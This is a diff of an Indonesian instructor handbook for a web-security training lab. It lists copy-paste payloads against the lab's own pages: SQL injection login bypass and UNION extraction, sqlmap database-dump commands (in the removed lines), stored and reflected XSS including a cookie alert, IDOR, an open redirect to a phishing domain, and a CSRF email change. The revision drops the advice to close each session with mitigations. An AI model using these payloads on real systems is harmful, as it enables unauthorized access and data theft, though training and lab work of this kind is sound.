@@ -1,79 +1,108 @@
 # 🛡️ ACT LAB :: INSTRUCTOR HANDBOOK (NATIONAL SEMINAR EDITION)
 
-Selamat datang di modul panduan instruktur. Dokumen ini dirancang untuk membantu penyampaian materi eksploitasi secara live. Fokus kita adalah pada metodologi **Manual** dan **Automated** menggunakan tools standar industri.
+Buku panduan ini berisi **Payload Langsung** untuk demonstrasi eksploitasi cepat di depan audiens. Gunakan ini untuk menunjukkan kerentanan secara instan.
 
 ---
 
-## 1. SQL INJECTION (SQLi) - AUTH BYPASS
+## 1. SQL INJECTION :: AUTH BYPASS
 **Target:** Login Page (`/lab/sqli-login`)
 
-### Metodologi Manual (Tutor Style)
-*   **Analisis Awal:** Masukkan karakter `'` (single quote) pada kolom password. Jelaskan ke audiens bahwa error atau respon aneh menunjukkan input tidak di-sanitasi.
-*   **Payload Universal:** 
-    *   `admin' --` (Bypass username)
-    *   `' OR '1'='1' --` (Bypass password logic)
-    *   `") OR ("1"="1" --` (Payload nyeleneh untuk bypass filter kurung)
-*   **Burp Suite Step:** 
-    1. Intercept request POST ke `/api/auth/login`.
-    2. Kirim ke **Intruder**.
-    3. Gunakan wordlist `SQLi - Auth Bypass` untuk menunjukkan betapa cepatnya bypass ini dilakukan.
+### ⚡ Direct Payload (Copy-Paste)
+*   **Username:** `admin`
+*   **Password:** `' OR '1'='1' --`
+*   **Alternative (Nyeleneh):** `admin' --`
+
+### 🛠️ Manual Step-by-Step
+1. Jelaskan bahwa input password tidak divalidasi.
+2. Karakter `'` akan memutus query SQL di server.
+3. Logic `'1'='1'` akan selalu bernilai TRUE, memaksa server memberikan akses tanpa password yang benar.
 
 ---
 
-## 2. SQL INJECTION (SQLi) - UNION BASED
-**Target:** Search Field (`/lab/sqli-union`)
+## 2. SQL INJECTION :: UNION EXTRACTION
+**Target:** Search Page (`/lab/sqli-union`)
 
-### Eksploitasi Automated (SQLmap)
-Sampaikan bahwa dalam audit nyata, kita menggunakan otomasi untuk menghemat waktu.
-*   **Command:** 
-    ```bash
-    sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dbs
-    ```
-*   **Dumping Data:**
-    ```bash
-    sqlmap -u "http://act-lab.app/api/search?q=test" -D actlab -T challenges --dump
-    ```
-*   **Point Utama:** Jelaskan bagaimana SQLmap mendeteksi jumlah kolom secara otomatis menggunakan teknik UNION.
+### ⚡ Direct Payload (Copy-Paste)
+*   **Search Box:** `' UNION SELECT 1,flag,3,4,5,6,7,8 FROM challenges--`
+
+### 🛠️ Manual Step-by-Step
+1. Masukkan `' ORDER BY 8--` untuk membuktikan ada 8 kolom.
+2. Gunakan `UNION SELECT` untuk menggabungkan hasil pencarian dengan data dari tabel lain.
+3. Taruh kolom `flag` di posisi kedua untuk menampilkan Flag rahasia di layar hasil pencarian.
 
 ---
 
-## 3. XSS (CROSS-SITE SCRIPTING) - STORED
-**Target:** Guestbook (`/lab/xss-stored`)
+## 3. XSS (STORED) :: GUESTBOOK ATTACK
+**Target:** Guestbook Page (`/lab/xss-stored`)
 
-### Metodologi Phishing & Cookie Stealing
-*   **Payload Nyeleneh:** 
-    *   `<img src=x onerror=alert(1)>` (Klasik)
-    *   `<svg/onload=alert('ACT_PWNED')>` (Bypass filter tag script)
-    *   `<details open ontoggle=alert(document.cookie)>` (Payload modern)
-*   **Demonstrasi:** Jelaskan bahwa payload ini tersimpan di database. Setiap kali user lain (atau admin) membuka halaman ini, script kita akan tereksekusi di browser mereka.
+### ⚡ Direct Payload (Copy-Paste)
+*   **Message:** `<script>alert('PWNED BY ACT LAB');</script>`
+*   **Alternative (Bypass):** `<img src=x onerror="alert('XSS_SUCCESS')">`
+
+### 🛠️ Manual Step-by-Step
+1. Masukkan script HTML/JS ke dalam form komentar.
+2. Jelaskan bahwa server menyimpan script ini secara permanen di database.
+3. Setiap kali user lain mengunjungi halaman, browser mereka akan menjalankan script tersebut secara otomatis.
 
 ---
 
-## 4. IDOR (INSECURE DIRECT OBJECT REFERENCE)
+## 4. XSS (REFLECTED) :: SEARCH PARAMETER
+**Target:** Search URL (`/lab/xss-reflected`)
+
+### ⚡ Direct Payload (Copy-Paste URL)
+*   `?q=<marquee><h1>HIJACKED</h1></marquee>`
+*   `?q=<script>alert(document.domain)</script>`
+
+### 🛠️ Manual Step-by-Step
+1. Masukkan payload ke parameter pencarian di URL.
+2. Tunjukkan bahwa input kita "dipantulkan" (reflected) langsung ke halaman tanpa filter, sehingga browser mengeksekusinya sebagai kode HTML.
+
+---
+
+## 5. IDOR :: PROFILE MANIPULATION
 **Target:** Profile Viewer (`/lab/idor`)
 
-### Manipulasi Parameter (Burp Suite)
-*   **Skenario:** Peserta melihat profil mereka sendiri (`id=999`).
-*   **Eksploitasi:** 
-    1. Gunakan Burp **Repeater**.
-    2. Ubah `id=999` menjadi `id=1` atau `id=2`.
-    3. Tunjukkan bahwa kita bisa melihat data sensitif user lain tanpa izin.
-*   **Analisis:** Jelaskan pentingnya Access Control List (ACL) di sisi server.
+### ⚡ Direct Payload (Copy-Paste)
+*   Ubah User ID di input menjadi: `1` atau `2`
+
+### 🛠️ Manual Step-by-Step
+1. Login sebagai user biasa (cek ID Anda sendiri, misal 999).
+2. Tunjukkan bahwa dengan hanya mengubah angka ID di input, kita bisa melihat biodata dan email **ADMIN** atau user lain tanpa proteksi.
+3. Jelaskan ini terjadi karena server tidak mengecek apakah user yang merequest punya hak akses ke data tersebut.
 
 ---
 
-## 5. OPEN REDIRECT
+## 6. OPEN REDIRECT :: PHISHING GATEWAY
 **Target:** Navigation Gateway (`/lab/redirect`)
 
-### Phishing Simulation
-*   **Payload:** `?url=https://evil-site.com`
-*   **Metode:** Tunjukkan bagaimana URL yang terlihat "aman" (berawalan domain kita) bisa menjerumuskan user ke situs berbahaya.
+### ⚡ Direct Payload (Copy-Paste URL)
+*   `?url=https://google.com`
+*   `?url=//evil-phishing.com`
+
+### 🛠️ Manual Step-by-Step
+1. Tunjukkan link yang tampak resmi dari domain kita.
+2. Begitu diklik, user malah terlempar ke situs luar.
+3. Jelaskan ini sering dipakai attacker untuk membuat link phishing yang terlihat terpercaya.
 
 ---
 
-## 🛰️ TIPS SEMINAR
-1.  **Gunakan Burp Suite** di layar proyektor. Audiens sangat suka melihat *Raw HTTP Request*.
-2.  **Payload Nyeleneh:** Tantang peserta untuk mencoba payload dari [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings). Sistem kita sudah didesain universal untuk menerima variasi input selama logika SQL/HTML-nya benar.
-3.  **Kesimpulan:** Selalu tutup setiap sesi dengan **Mitigasi**. Jangan hanya ajarkan cara merusak, tapi cara memperbaiki (Parameterized Queries, Input Validation, CSP).
+## 7. CSRF (CROSS-SITE REQUEST FORGERY)
+**Target:** Account Settings (`/lab/csrf`)
+
+### ⚡ Direct Payload (Exploit Concept)
+*   `api/profile` (POST Request) dengan payload: `{"email": "hacker@evil.com"}`
+
+### 🛠️ Manual Step-by-Step (Burp Suite)
+1. Buka Burp Suite Intercept.
+2. Ubah email di halaman profil, lalu klik "Update".
+3. Tunjukkan di Burp bahwa request ini tidak punya "Anti-CSRF Token".
+4. Jelaskan attacker bisa menjebak user mengklik link jahat yang diam-diam mengganti email mereka.
+
+---
+
+**ACT LAB :: SEMINAR CYBER SECURITY TOOLS**
+*   **Burp Suite:** Intercept & Manipulasi Parameter.
+*   **SQLmap:** Otomasi Dumping Database.
+*   **Developer Tools (F12):** Analisis DOM & Network Request.
 
 **ACT LAB :: EMPOWERING CYBER SECURITY**
